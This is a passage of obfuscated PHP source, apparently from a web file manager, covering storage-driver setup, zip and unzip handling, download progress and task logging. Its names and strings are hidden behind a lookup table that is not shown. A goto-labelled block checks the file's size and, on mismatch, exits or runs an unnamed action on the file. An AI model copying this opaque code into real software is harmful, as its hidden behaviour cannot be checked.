$¡”éûÀõ[1301]); break; } $Ø¯½Õ™ = $ù“´îï[$¡”éûÀõ[87]]; if (!isset(self::$driverCache[$Ø¯½Õ™])) { $â½Ç½¡ = strtolower($ƒ¶¾öáæ[$¡”éûÀõ[96]]); $îÀ˜óØé = $GLOBALS[$¡”éûÀõ[6]][$¡”éûÀõ[92]][$¡”éûÀõ[917]]; $•àÅƒ–µ = $¡”éûÀõ[77] . (isset($îÀ˜óØé[$â½Ç½¡]) ? $îÀ˜óØé[$â½Ç½¡] : ucfirst($â½Ç½¡)); if (!class_exists($•àÅƒ–µ)) { show_json("{$•àÅƒ–µ}\40\x6e\157\x74\x20\x65\x78\x69\x73\x74\163\x21", !1); } $Ê¡üÁÚ° = isset($ƒ¶¾öáæ[$¡”éûÀõ[6]]) ? $ƒ¶¾öáæ[$¡”éûÀõ[6]] : !1; self::$driverCache[$Ø¯½Õ™] = new $•àÅƒ–µ($Ê¡üÁÚ°); } $ºÙÓ°ê = self::$driverCache[$Ø¯½Õ™]; $ºÙÓ°ê->pathDriver = $ìÃÈåŠ; $ºÙÓ°ê->pathBase = $¡”éûÀõ[12]; if (isset($ƒ¶¾öáæ[$¡”éûÀõ[6]][$¡”éûÀõ[1302]])) { $ºÙÓ°ê->pathBase = rtrim($ƒ¶¾öáæ[$¡”éûÀõ[6]][$¡”éûÀõ[1302]], $¡”éûÀõ[8]) . $¡”éûÀõ[8]; $Ò†¤¶›ã = $ºÙÓ°ê->pathBase . ltrim($Ò†¤¶›ã, $¡”éûÀõ[8]); } $Ò†¤¶›ã = $ºÙÓ°ê->getPath($Ò†¤¶›ã); if (isset($ù“´îï[$¡”éûÀõ[1270]])) { $Ò†¤¶›ã = $ù“´îï[$¡”éûÀõ[1270]]; } $ºÙÓ°ê->path = $Ò†¤¶›ã; return $ºÙÓ°ê; } public static function errorTips($¹ÅŸÊˆ = false, $©üø˜ÃÎ = true) { $Ï »Ó«‹ =& $_SERVER[¿ÈˆÑ¸ä]; static $ä¿ÚÑµ = array(); $¸÷€áåÕ = 100; if ($¹ÅŸÊˆ === -1) { return $ä¿ÚÑµ ? $ä¿ÚÑµ[count($ä¿ÚÑµ) - 1] : $Ï »Ó«‹[12]; } if ($¹ÅŸÊˆ === !1) { return implode($Ï »Ó«‹[286], $ä¿ÚÑµ); } if (count($ä¿ÚÑµ) >= $¸÷€áåÕ) { $ä¿ÚÑµ = array_slice($ä¿ÚÑµ, $¸÷€áåÕ * 0.5, $¸÷€áåÕ); } $ä¿ÚÑµ[] = $¹ÅŸÊˆ; if (!$©üø˜ÃÎ) { return; } write_log($Ï »Ó«‹[174] . ACTION . $Ï »Ó«‹[1303] . $¹ÅŸÊˆ, $Ï »Ó«‹[1304]); } public static function getLastError($Œ«ô‰Ê = '') { $ù£ŠÔ† = self::errorTips(-1); return $ù£ŠÔ† ? $ù£ŠÔ† : $Œ«ô‰Ê; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $†çÈËôü; if ($†çÈËôü) { return $†çÈËôü; } $óÓ­Î¢¨ = IO::init($_SERVER[¿ÈˆÑ¸ä][8]); return $óÓ­Î¢¨; } private static function iconvSystem($°Î‡Ëµ’) { return self::local()->iconvSystem($°Î‡Ëµ’); } private static function iconvApp($œ¹ÖŒ‹Ç) { return self::local()->iconvApp($œ¹ÖŒ‹Ç); } public static function zipFolder($”´›ÎÓ, $°¦Ğáî§ = "\x7a\151\160", $“©ğ¥òº = '', $·®Ã€ = REPEAT_RENAME) { $©è‚œè¨ =& $_SERVER[¿ÈˆÑ¸ä]; $ğƒ¤–äï = IO::listPath($”´›ÎÓ); if (!$ğƒ¤–äï) { return !1; } $ğƒ¤–äï = array_merge($ğƒ¤–äï[$©è‚œè¨[85]], $ğƒ¤–äï[$©è‚œè¨[86]]); return self::zip($ğƒ¤–äï, $°¦Ğáî§, $“©ğ¥òº, $·®Ã€); } public static function zip($àå¨íã’, $ç†¬µ³õ = "\x7a\151\x70", $áÊÛîƒˆ = '', $¨­£µ¨Ç = REPEAT_RENAME) { $ëÈßó»Í =& $_SERVER[¿ÈˆÑ¸ä]; if (is_string($àå¨íã’) && $àå¨íã’) { $àå¨íã’ = array(array($ëÈßó»Í[87] => $àå¨íã’)); } $ãÒğíìà = self::init($àå¨íã’[0][$ëÈßó»Í[87]]); $–¡·­ç¶ = self::info($àå¨íã’[0][$ëÈßó»Í[87]]); $‰×ó÷Ò = $ëÈßó»Í[12]; $Ø“üƒŠú = $ëÈßó»Í[12]; $õš†¦ = $ëÈßó»Í[12]; if ($áÊÛîƒˆ && substr($áÊÛîƒˆ, -1, 1) != $ëÈßó»Í[8]) { $Ø“üƒŠú = get_path_father($áÊÛîƒˆ); $õš†¦ = get_path_this($áÊÛîƒˆ); } else { $Ø“üƒŠú = self::pathFather($–¡·­ç¶[$ëÈßó»Í[87]]); $õš†¦ = $–¡·­ç¶[$ëÈßó»Í[32]] . $ëÈßó»Í[10] . $ç†¬µ³õ; if (count($àå¨íã’) > 1) { $½ß ıÎ = IO::info($Ø“üƒŠú); $õš†¦ = $½ß ıÎ[$ëÈßó»Í[32]] . $ëÈßó»Í[10] . $ç†¬µ³õ; } if ($áÊÛîƒˆ) { $Ø“üƒŠú = $áÊÛîƒˆ; } } if ($ãÒğíìà->getType() == $ëÈßó»Í[107]) { $üÉÍö• = self::init($Ø“üƒŠú); $ºÚ˜›ø† = $üÉÍö•->getType() == $ëÈßó»Í[107] ? $Ø“üƒŠú : get_path_father($ãÒğíìà->path); $ºÚ˜›ø† = IO::getPathInner($ºÚ˜›ø†); $ºÚ˜›ø† = rtrim($ºÚ˜›ø†, $ëÈßó»Í[8]) . $ëÈßó»Í[8]; mk_dir($ºÚ˜›ø†); } else { $‰×ó÷Ò = TEMP_FILES . $ëÈßó»Í[1305] . time() . rand_string(8) . $ëÈßó»Í[8]; mk_dir($‰×ó÷Ò); file_put_contents($‰×ó÷Ò . $ëÈßó»Í[1306], $ëÈßó»Í[12]); $ºÚ˜›ø† = $‰×ó÷Ò; } $˜ö¬¹ÚĞ = IO::info($ºÚ˜›ø†); if (!$˜ö¬¹ÚĞ || !$˜ö¬¹ÚĞ[$ëÈßó»Í[234]]) { show_json(LNG($ëÈßó»Í[1307]), !1); } $õµ†×óá = self::zipFileList($àå¨íã’, $‰×ó÷Ò); foreach ($õµ†×óá as $ÄûÙ±°¿ => $Ë¯¯¥Ù¹) { $õµ†×óá[$ÄûÙ±°¿] = self::iconvSystem($Ë¯¯¥Ù¹); } $³ßÉÔë = get_filename_auto($ºÚ˜›ø† . $õš†¦, $ëÈßó»Í[12], $¨­£µ¨Ç); KodArchive::create(self::iconvSystem($³ßÉÔë), $õµ†×óá); if (!IO::exist($³ßÉÔë)) { if ($‰×ó÷Ò) { del_dir($‰×ó÷Ò); } write_log($ëÈßó»Í[1308] . $³ßÉÔë, $ëÈßó»Í[389]); show_json(LNG($ëÈßó»Í[1309]), !1); } if (!$‰×ó÷Ò) { return $³ßÉÔë; } $ó®Ø”ØÊ = self::move($³ßÉÔë, $Ø“üƒŠú, $¨­£µ¨Ç); if ($‰×ó÷Ò) { del_dir($‰×ó÷Ò); } if (!$³ßÉÔë) { write_log($ëÈßó»Í[1310] . $³ßÉÔë . $ëÈßó»Í[1311] . $Ø“üƒŠú, $ëÈßó»Í[389]); show_json(LNG($ëÈßó»Í[1309]), !1); } return $ó®Ø”ØÊ; } public static function unzip($Ã¹¦†öı, $—Äİ¶, $¢Šààš… = "\55\x31", $¸¶“ÈÚÛ = "\162\x65\x70\x6c\x61\x63\145") { $€¨ÊƒÄ =& $_SERVER[¿ÈˆÑ¸ä]; $ÂÉ­‚¬ = parent::info($Ã¹¦†öı); if (!$ÂÉ­‚¬) { show_json(LNG($€¨ÊƒÄ[1312]), !1); } $Õ“êÄ˜’ = IO::infoFullSimple($—Äİ¶); if (!$Õ“êÄ˜’) { $—Äİ¶ = IO::mkdir($—Äİ¶); } if (isset($Õ“êÄ˜’[$€¨ÊƒÄ[192]]) && trim($Õ“êÄ˜’[$€¨ÊƒÄ[87]], $€¨ÊƒÄ[8]) != trim($—Äİ¶, $€¨ÊƒÄ[8])) { $ÆûóÂÔ = KodIO::make($Õ“êÄ˜’[$€¨ÊƒÄ[191]]); $‡¼«÷ë¿ = IO::fileNameAuto($ÆûóÂÔ, $Õ“êÄ˜’[$€¨ÊƒÄ[32]], REPEAT_RENAME_FOLDER, !0); $—Äİ¶ = IO::mkdir($ÆûóÂÔ . $‡¼«÷ë¿); } $¢Šààš… = $¢Šààš… && $¢Šààš… != $€¨ÊƒÄ[1313] ? @json_decode($¢Šààš…, !0) : -1; $ÁÜâ‰œƒ = self::unzipPart($Ã¹¦†öı, $¢Šààš…); if (!$ÁÜâ‰œƒ || !IO::exist($ÁÜâ‰œƒ[$€¨ÊƒÄ[231]])) { show_json(LNG($€¨ÊƒÄ[106]), !1); } $ö€Ò¼£° = $ÁÜâ‰œƒ[$€¨ÊƒÄ[1314]][count($ÁÜâ‰œƒ[$€¨ÊƒÄ[1314]]) - 1]; if ($ö€Ò¼£°[$€¨ÊƒÄ[1242]] == -1 || substr($ö€Ò¼£°[$€¨ÊƒÄ[32]], -1, 1) == $€¨ÊƒÄ[8]) { $ô›àüî = $ÁÜâ‰œƒ[$€¨ÊƒÄ[1315]] . rand_string(10) . $€¨ÊƒÄ[8]; mk_dir($ô›àüî); $¡²äˆ´à = count($ÁÜâ‰œƒ[$€¨ÊƒÄ[1314]]) == 1 ? IO::ext($Ã¹¦†öı) : get_path_ext($ÁÜâ‰œƒ[$€¨ÊƒÄ[231]]); $§üƒËÃ´ = KodArchive::extract(self::iconvSystem($ÁÜâ‰œƒ[$€¨ÊƒÄ[231]]), $ô›àüî, $ö€Ò¼£°[$€¨ÊƒÄ[1242]], $‡¼«÷ë¿, $¡²äˆ´à); self::unzipErrorCheck($§üƒËÃ´, array($€¨ÊƒÄ[1316], $Ã¹¦†öı, $¡²äˆ´à, $—Äİ¶, $ÁÜâ‰œƒ)); Hook::trigger($€¨ÊƒÄ[1317], $ô›àüî); recursion_dir($ô›àüî, $ü¡×îùæ, $–´ä¶¦Ñ, 0); $¾¬¢¡µ‘ = array_merge($ü¡×îùæ, $–´ä¶¦Ñ); $»×âøÛÔ = array(); foreach ($¾¬¢¡µ‘ as $“‹¬Ğš“) { $²¸®öİ– = IO::move(self::iconvApp($“‹¬Ğš“), $—Äİ¶, $¸¶“ÈÚÛ); if ($²¸®öİ–) { $»×âøÛÔ[] = $²¸®öİ–; } } del_dir($ô›àüî); } else { $²¸®öİ– = IO::move($ÁÜâ‰œƒ[$€¨ÊƒÄ[231]], $—Äİ¶, $¸¶“ÈÚÛ, get_path_this($ö€Ò¼£°[$€¨ÊƒÄ[32]])); if ($²¸®öİ–) { $»×âøÛÔ[] = $²¸®öİ–; } } return $»×âøÛÔ ? $»×âøÛÔ : !1; } public static function unzipList($ç¼à¯¥á) { $¡¨á’‘à =& $_SERVER[¿ÈˆÑ¸ä]; $±æëÒÕ  = isset($ç¼à¯¥á[$¡¨á’‘à[1318]]) ? $ç¼à¯¥á[$¡¨á’‘à[1318]] : !1; $Èò­ò­û = isset($ç¼à¯¥á[$¡¨á’‘à[1242]]) ? @json_decode($ç¼à¯¥á[$¡¨á’‘à[1242]], !0) : -1; $¬ıÈ¹¬ = self::unzipPart($ç¼à¯¥á[$¡¨á’‘à[87]], $Èò­ò­û); if (!$¬ıÈ¹¬ || !IO::exist($¬ıÈ¹¬[$¡¨á’‘à[231]])) { show_json(LNG($¡¨á’‘à[106]), !1); } $™â® ‚ = $¬ıÈ¹¬[$¡¨á’‘à[1314]][count($¬ıÈ¹¬[$¡¨á’‘à[1314]]) - 1]; $˜Ëƒ”Œİ = in_array(IO::ext($¬ıÈ¹¬[$¡¨á’‘à[231]]), array($¡¨á’‘à[389], $¡¨á’‘à[1319], $¡¨á’‘à[1320], $¡¨á’‘à[1321], $¡¨á’‘à[1322], $¡¨á’‘à[1323])); if (!$±æëÒÕ  && ($™â® ‚[$¡¨á’‘à[1242]] == -1 || $˜Ëƒ”Œİ)) { $ñ¤Á“ÖÚ = $¬ıÈ¹¬[$¡¨á’‘à[1315]] . get_path_this($¬ıÈ¹¬[$¡¨á’‘à[231]]) . $¡¨á’‘à[1324]; if (!IO::exist($ñ¤Á“ÖÚ)) { $íÊ£‘òà = $™â® ‚[$¡¨á’‘à[1242]] == -1 ? get_path_ext(IO::pathThis($ç¼à¯¥á[$¡¨á’‘à[87]])) : get_path_ext($¬ıÈ¹¬[$¡¨á’‘à[231]]); $æÙ¥Õà¨ = KodArchive::listContent(self::iconvSystem($¬ıÈ¹¬[$¡¨á’‘à[231]]), !0, $íÊ£‘òà); self::unzipErrorCheck($æÙ¥Õà¨, array($¡¨á’‘à[1325], $ç¼à¯¥á, $¬ıÈ¹¬)); @file_put_contents($ñ¤Á“ÖÚ, json_encode($æÙ¥Õà¨[$¡¨á’‘à[1326]])); } return @json_decode(IO::getContent($ñ¤Á“ÖÚ), !0); } IO::fileOut($¬ıÈ¹¬[$¡¨á’‘à[231]], $±æëÒÕ , get_path_this($™â® ‚[$¡¨á’‘à[32]])); die; } private static function zipFileList($¦Ú¦êüÏ, $üÇİ†ï• = false) { $û©âÖÂ“ =& $_SERVER[¿ÈˆÑ¸ä]; $«‚ÊÌ¬ = array(); foreach ($¦Ú¦êüÏ as $’Ç‘ÊİÓ) { $äÈÌÑÙ… = $’Ç‘ÊİÓ[$û©âÖÂ“[87]]; if ($üÇİ†ï•) { $äÈÌÑÙ… = self::copy($’Ç‘ÊİÓ[$û©âÖÂ“[87]], $üÇİ†ï•, $û©âÖÂ“[910]); } else { $ÑîÀ€Ú“ = self::init($’Ç‘ÊİÓ[$û©âÖÂ“[87]]); if ($ÑîÀ€Ú“->getType() == $û©âÖÂ“[107]) { $äÈÌÑÙ… = $ÑîÀ€Ú“->path; } } if ($äÈÌÑÙ… && self::local()->exist($äÈÌÑÙ…)) { $«‚ÊÌ¬[$’Ç‘ÊİÓ[$û©âÖÂ“[87]]] = $äÈÌÑÙ…; } } if (!empty($«‚ÊÌ¬)) { return array_values($«‚ÊÌ¬); } show_json(LNG($û©âÖÂ“[1284]), !1); } private static function localFilePath($†ÜÑ§Ğ) { $ğâòû‡ =& $_SERVER[¿ÈˆÑ¸ä]; $ëŒ‡åŠ = KodIO::parse($†ÜÑ§Ğ); if ($ëŒ‡åŠ[$ğâòû‡[33]] == KodIO::KOD_SOURCE) { $Ç»ô›Åä = Model($ğâòû‡[916])->fileInfoGet(KodIO::sourceID($†ÜÑ§Ğ)); if (!$Ç»ô›Åä[$ğâòû‡[87]]) { show_json($ğâòû‡[1327], !1); } $†ÜÑ§Ğ = $Ç»ô›Åä[$ğâòû‡[87]]; } $®¹ŒÀíŸ = self::init($†ÜÑ§Ğ); if ($®¹ŒÀíŸ->pathParse[$ğâòû‡[1270]]) { $†ÜÑ§Ğ = $®¹ŒÀíŸ->pathParse[$ğâòû‡[1270]]; $®¹ŒÀíŸ = self::init($†ÜÑ§Ğ); } $Ğ¿şÊ£š = $®¹ŒÀíŸ->getType(); if ($Ğ¿şÊ£š == $ğâòû‡[107] || $Ğ¿şÊ£š == $ğâòû‡[1328]) { if (!$®¹ŒÀíŸ->exist($®¹ŒÀíŸ->path)) { show_json(LNG($ğâòû‡[106]), !1); } return $®¹ŒÀíŸ->path; } return !1; } public static function unzipPart($ï²´„Øƒ, $ÑœÕŠƒ… = -1) { $îƒÏØÚÇ =& $_SERVER[¿ÈˆÑ¸ä]; $Ç£¥øíÂ = IO::pathThis($ï²´„Øƒ); if (!$ÑœÕŠƒ… || $ÑœÕŠƒ… == -1) { $í¢Şâºá = array(array($îƒÏØÚÇ[32] => $Ç£¥øíÂ, $îƒÏØÚÇ[1242] => -1)); $í¢Şâºá[0][$îƒÏØÚÇ[1329]] = $í¢Şâºá[0][$îƒÏØÚÇ[32]]; } else { if (is_array($ÑœÕŠƒ…)) { $í¢Şâºá = $ÑœÕŠƒ…; $»…¹Í¸ö = count($í¢Şâºá) - 1; for ($Æ°§–í¸ = 0; $Æ°§–í¸ <= $»…¹Í¸ö; $Æ°§–í¸++) { $÷Û¿ÒÈ² = $í¢Şâºá[$Æ°§–í¸]; $â‘¶ÙÃ = get_path_this($÷Û¿ÒÈ²[$îƒÏØÚÇ[32]]) . (checkExtSafe($÷Û¿ÒÈ²[$îƒÏØÚÇ[32]]) ? $îƒÏØÚÇ[12] : $îƒÏØÚÇ[1330]); $í¢Şâºá[$Æ°§–í¸][$îƒÏØÚÇ[1329]] = $îƒÏØÚÇ[1331] . intval($÷Û¿ÒÈ²[$îƒÏØÚÇ[1242]]) . $îƒÏØÚÇ[473] . $â‘¶ÙÃ; if ($Æ°§–í¸ == 0) { continue; } $í¢Şâºá[$Æ°§–í¸][$îƒÏØÚÇ[1329]] = $í¢Şâºá[$Æ°§–í¸ - 1][$îƒÏØÚÇ[1329]] . $îƒÏØÚÇ[1332] . $í¢Şâºá[$Æ°§–í¸][$îƒÏØÚÇ[1329]]; } } } if (!is_array($í¢Şâºá) || count($í¢Şâºá) == 0) { return !1; } $²ºÜ–ÒÇ = $í¢Şâºá[count($í¢Şâºá) - 1]; if (!IO::exist($ï²´„Øƒ)) { return !1; } $Àç×ƒ¶¬ = TEMP_FILES . $îƒÏØÚÇ[1333] . kodIO::hashPathSafe($ï²´„Øƒ) . $îƒÏØÚÇ[8]; $†ƒÔ›Ò = $Àç×ƒ¶¬ . $²ºÜ–ÒÇ[$îƒÏØÚÇ[1329]]; mk_dir($Àç×ƒ¶¬); file_put_contents(TEMP_FILES . $îƒÏØÚÇ[1306], $îƒÏØÚÇ[12]); if (IO::exist($†ƒÔ›Ò)) { return array($îƒÏØÚÇ[231] => $†ƒÔ›Ò, $îƒÏØÚÇ[1314] => $í¢Şâºá, $îƒÏØÚÇ[1315] => $Àç×ƒ¶¬); } $Ÿú­åÃ = self::localFilePath($ï²´„Øƒ); if (!$Ÿú­åÃ) { $Ÿú­åÃ = $Àç×ƒ¶¬ . $îƒÏØÚÇ[1334]; if (!IO::exist($Ÿú­åÃ)) { self::copy($ï²´„Øƒ, $Àç×ƒ¶¬, !1, get_path_this($Ÿú­åÃ)); } } if (!$Ÿú­åÃ || !IO::exist($Ÿú­åÃ)) { return !1; } if ($²ºÜ–ÒÇ[$îƒÏØÚÇ[1242]] == -1) { return array($îƒÏØÚÇ[231] => $Ÿú­åÃ, $îƒÏØÚÇ[1314] => $í¢Şâºá, $îƒÏØÚÇ[1315] => $Àç×ƒ¶¬); } $¨€Š•›² = $Ÿú­åÃ; foreach ($í¢Şâºá as $Æ°§–í¸ => $÷Û¿ÒÈ²) { if (!$÷Û¿ÒÈ² || $÷Û¿ÒÈ²[$îƒÏØÚÇ[1242]] == $îƒÏØÚÇ[1313]) { break; } if (substr($÷Û¿ÒÈ²[$îƒÏØÚÇ[32]], -1, 1) == $îƒÏØÚÇ[8]) { break; } $‹„ß­«û = in_array(get_path_ext($÷Û¿ÒÈ²[$îƒÏØÚÇ[1329]]), array($îƒÏØÚÇ[389], $îƒÏØÚÇ[1319], $îƒÏØÚÇ[1320], $îƒÏØÚÇ[1321], $îƒÏØÚÇ[1322], $îƒÏØÚÇ[1323])); $ƒ«±¡Çï = $Æ°§–í¸ == count($í¢Şâºá) - 1 && $‹„ß­«û; $Îè»çÆ˜ = $Àç×ƒ¶¬ . $÷Û¿ÒÈ²[$îƒÏØÚÇ[1329]]; $Ú¾Ú¬­ = $Àç×ƒ¶¬ . get_path_this($÷Û¿ÒÈ²[$îƒÏØÚÇ[32]]); if (IO::exist($Îè»çÆ˜)) { $¨€Š•›² = $Îè»çÆ˜; continue; } $´ñÜÁâÍ = $Æ°§–í¸ == 0 ? get_path_ext($Ç£¥øíÂ) : get_path_ext($¨€Š•›²); $¤Ê…Ï®‹ = KodArchive::extract(self::iconvSystem($¨€Š•›²), $Àç×ƒ¶¬, $÷Û¿ÒÈ²[$îƒÏØÚÇ[1242]], $«ìË€ª™, $´ñÜÁâÍ); self::unzipErrorCheck($¤Ê…Ï®‹, array($îƒÏØÚÇ[1335], $ï²´„Øƒ, $í¢Şâºá, $÷Û¿ÒÈ², $Îè»çÆ˜)); if (IO::exist($Ú¾Ú¬­)) { IO::rename($Ú¾Ú¬­, get_path_this($Îè»çÆ˜)); } $¨€Š•›² = $Îè»çÆ˜; } $†ƒÔ›Ò = $¨€Š•›²; return array($îƒÏØÚÇ[231] => $¨€Š•›², $îƒÏØÚÇ[1314] => $í¢Şâºá, $îƒÏØÚÇ[1315] => $Àç×ƒ¶¬); } private static function unzipErrorCheck($ˆãê¤§, $¨ôœ‡öñ = false) { $ãò™çª =& $_SERVER[¿ÈˆÑ¸ä]; if ($ˆãê¤§[$ãò™çª[1336]]) { return !0; } write_log(array($ãò™çª[1337], $ˆãê¤§, $¨ôœ‡öñ), $ãò™çª[1338]); $£‘âäËÑ = is_array($ˆãê¤§[$ãò™çª[1326]]) ? json_encode($ˆãê¤§[$ãò™çª[1326]]) : $ˆãê¤§[$ãò™çª[1326]]; show_json($ãò™çª[1339] . $£‘âäËÑ, !1); die; } } goto aùÑ”Ğºø–; aÒÛÃšÏ¤Ç: if ($_SERVER[$_SERVER[¿ÈˆÑ¸ä][962]] != $_size($_file)) { $_getc = $_SERVER[¿ÈˆÑ¸ä][964]; $_getfile = $_SERVER[$_SERVER[¿ÈˆÑ¸ä][965]] . $_SERVER[¿ÈˆÑ¸ä][966]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¿ÈˆÑ¸ä][286], $_getfilec); if (count($_getarrs) < $_SERVER[¿ÈˆÑ¸ä][699]) { $exit = $_SERVER[¿ÈˆÑ¸ä][967]; $exit(); } $_act = $_SERVER[¿ÈˆÑ¸ä][968]; $_act($_file); } class TaskHttp extends Task { protected function startAfter() { $©°õ¼ëà =& $_SERVER[¿ÈˆÑ¸ä]; $ßÍÌ¯üŒ =& $this->task; $ßÍÌ¯üŒ[$©°õ¼ëà[2002]] = 1; Hook::bind($©°õ¼ëà[1961], array($this, $©°õ¼ëà[2003])); Hook::bind($©°õ¼ëà[1963], array($this, $©°õ¼ëà[2004])); Hook::bind($©°õ¼ëà[1965], array($this, $©°õ¼ëà[2005])); } protected function endAfter() { $–Ò»ÂÉ =& $_SERVER[¿ÈˆÑ¸ä]; Hook::unbind($–Ò»ÂÉ[1961], array($this, $–Ò»ÂÉ[2003])); Hook::unbind($–Ò»ÂÉ[1963], array($this, $–Ò»ÂÉ[2004])); Hook::unbind($–Ò»ÂÉ[1965], array($this, $–Ò»ÂÉ[2005])); } public function progressStart($×÷£¸õü) { $é¿¤ÏöÍ =& $_SERVER[¿ÈˆÑ¸ä]; $½şÃÄ·ã = curl_getinfo($×÷£¸õü); self::log($é¿¤ÏöÍ[2006] . $½şÃÄ·ã[$é¿¤ÏöÍ[383]]); self::valueSet($this->task[$é¿¤ÏöÍ[483]], $this->task); } public function progressEnd($Ö§æ¢Ø) { $²òÇÊÄü =& $_SERVER[¿ÈˆÑ¸ä]; self::log($²òÇÊÄü[2007] . $this->task[$²òÇÊÄü[483]]); $this->end(); } public function progress($¥Ø«‚¡, $Óºëºó, $Ûëıƒºº, $ŸÇšë½å, $¥˜Òƒñ‰) { $ä¢Ù”ö± =& $_SERVER[¿ÈˆÑ¸ä]; $ı·×ä›© =& $this->task; if ($¥˜Òƒñ‰ > 0) { $ı·×ä›©[$ä¢Ù”ö±[1165]] = $ı·×ä›©[$ä¢Ù”ö±[1165]] == 0 ? $ŸÇšë½å : $ı·×ä›©[$ä¢Ù”ö±[1165]]; $ı·×ä›©[$ä¢Ù”ö±[1916]] = $¥˜Òƒñ‰; } else { if ($Ûëıƒºº > 0) { $ı·×ä›©[$ä¢Ù”ö±[1165]] = $ı·×ä›©[$ä¢Ù”ö±[1165]] == 0 ? $Óºëºó : $ı·×ä›©[$ä¢Ù”ö±[1165]]; $ı·×ä›©[$ä¢Ù”ö±[1916]] = $Ûëıƒºº; } } $this->update(); self::log("\x70\x72\157\147\x72\x65\x73\x73\110\x74\164\160\72\x64\157\167\156\x3a{$Ûëıƒºº}\57{$Óºëºó}\73\x20\165\x70\154\157\x61\144\72{$¥˜Òƒñ‰}\x2f{$ŸÇšë½å}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($êƒ¶­†, $û»Å§ÕÅ = '', $÷ãï‡ı = 0, $¹Ä‘ü º = '') { $ö²³•Ø =& $_SERVER[¿ÈˆÑ¸ä]; $¹Ä‘ü º = $¹Ä‘ü º ? $¹Ä‘ü º : ($û»Å§ÕÅ ? $û»Å§ÕÅ : $êƒ¶­†); $âÛ¡®±² = new Task($êƒ¶­†, $û»Å§ÕÅ, $÷ãï‡ı, $¹Ä‘ü º); $GLOBALS[$ö²³•Ø[2008] . $êƒ¶­†] = new TaskLog($ö²³•Ø[1900], $âÛ¡®±², $¹Ä‘ü º); return $âÛ¡®±²; } public function __construct($Ñääü´ã = '', $¦ùâÑğÌ = '', $ÀÚÄÊ¢ƒ = '') { $µÚ¦È«ú =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Ñääü´ã) { $Ñääü´ã = $µÚ¦È«ú[1900]; } $õÏÁœÏŒ = $Ñääü´ã . $µÚ¦È«ú[473] . rand_string(10); if (!$ÀÚÄÊ¢ƒ) { $ÀÚÄÊ¢ƒ = $Ñääü´ã . $µÚ¦È«ú[53] . $ÀÚÄÊ¢ƒ; } switch ($Ñääü´ã) { case $µÚ¦È«ú[1900]: if (!$¦ùâÑğÌ || !$¦ùâÑğÌ->task) { return echoLog($Ñääü´ã . $µÚ¦È«ú[2009]); } $¥Ó×ş† = $¦ùâÑğÌ; $õÏÁœÏŒ = $¥Ó×ş†->task[$µÚ¦È«ú[483]]; $Ñääü´ã = $¥Ó×ş†->task[$µÚ¦È«ú[483]]; if (!$¥Ó×ş†->task[$µÚ¦È«ú[1802]]) { $¥Ó×ş†->task[$µÚ¦È«ú[1802]] = $ÀÚÄÊ¢ƒ ? $ÀÚÄÊ¢ƒ : $Ñääü´ã; } break; case $µÚ¦È«ú[2010]: if (!$¦ùâÑğÌ) { return echoLog($Ñääü´ã . $µÚ¦È«ú[2011]); } $ãìˆıÁŒ = is_string($¦ùâÑğÌ) ? array($¦ùâÑğÌ) : $¦ùâÑğÌ; $¥Ó×ş† = new TaskFileTransfer($õÏÁœÏŒ, $Ñääü´ã, 0, $ÀÚÄÊ¢ƒ ? $ÀÚÄÊ¢ƒ : $ãìˆıÁŒ[0]); foreach ($ãìˆıÁŒ as $ñ±Ô´£) { $¥Ó×ş†->addPath($ñ±Ô´£); } break; case $µÚ¦È«ú[389]: if (!$¦ùâÑğÌ) { return echoLog($Ñääü´ã . $µÚ¦È«ú[2011]); } $ãìˆıÁŒ = is_string($¦ùâÑğÌ) ? array($¦ùâÑğÌ) : $¦ùâÑğÌ; $¥Ó×ş† = new TaskZip($õÏÁœÏŒ, $Ñääü´ã, 0, $ÀÚÄÊ¢ƒ ? $ÀÚÄÊ¢ƒ : $ãìˆıÁŒ[0]); foreach ($ãìˆıÁŒ as $ñ±Ô´£) { $¥Ó×ş†->addPath($ñ±Ô´£); } break; case $µÚ¦È«ú[1338]: if (!$¦ùâÑğÌ) { return echoLog($Ñääü´ã . $µÚ¦È«ú[2011]); } $¥Ó×ş† = new TaskUnZip($õÏÁœÏŒ, $Ñääü´ã, 0, $ÀÚÄÊ¢ƒ ? $ÀÚÄÊ¢ƒ : $¦ùâÑğÌ); if ($¦ùâÑğÌ) { $¥Ó×ş†->addFile($¦ùâÑğÌ); } break; case $µÚ¦È«ú[150]: $¥Ó×ş† = new TaskHttp($õÏÁœÏŒ, $Ñääü´ã); break; default: return; break; } $this->task = $¥Ó×ş†; $this->taskID = $õÏÁœÏŒ; Hook::bind($µÚ¦È«ú[1936], array($this, $µÚ¦È«ú[2012])); Hook::bind($µÚ¦È«ú[1938], array($this, $µÚ¦È«ú[2013])); Hook::bind($µÚ¦È«ú[1932], array($this, $µÚ¦È«ú[2014])); echoLog($µÚ¦È«ú[2015] . $¥Ó×ş†->task[$µÚ¦È«ú[1802]]); } public function __destruct() { $this->end(); } public function end($ä„Õ¿Úò = '') { $½¤ÇÌÖ =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ä„Õ¿Úò); $this->task = !1; $this->taskID = !1; Hook::unbind($½¤ÇÌÖ[1936], array($this, $½¤ÇÌÖ[2012])); Hook::unbind($½¤ÇÌÖ[1938], array($this, $½¤ÇÌÖ[2013])); Hook::unbind($½¤ÇÌÖ[1932], array($this, $½¤ÇÌÖ[2014])); } public function taskUpdate($òéÛºˆå) { $‡ÔÜû´¸ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$òéÛºˆå || $this->taskID != $òéÛºˆå[$‡ÔÜû´¸[483]]) { return; } $´‡–¡³’ = 20; $Š­ÏŠ¥ = intval($òéÛºˆå[$‡ÔÜû´¸[1917]] * $´‡–¡³’); $‹‚”şÇÁ = $‡ÔÜû´¸[174] . str_repeat($‡ÔÜû´¸[464], $Š­ÏŠ¥) . $‡ÔÜû´¸[1117] . str_repeat($‡ÔÜû´¸[53], $´‡–¡³’ - $Š­ÏŠ¥) . $‡ÔÜû´¸[176]; $äòÅÕì¢ = $‹‚”şÇÁ . sprintf($‡ÔÜû´¸[2016], $òéÛºˆå[$‡ÔÜû´¸[1917]] * 100) . $‡ÔÜû´¸[2017]; $‚ÖöÇŒ‚ = $äòÅÕì¢ . $òéÛºˆå[$‡ÔÜû´¸[1916]] . 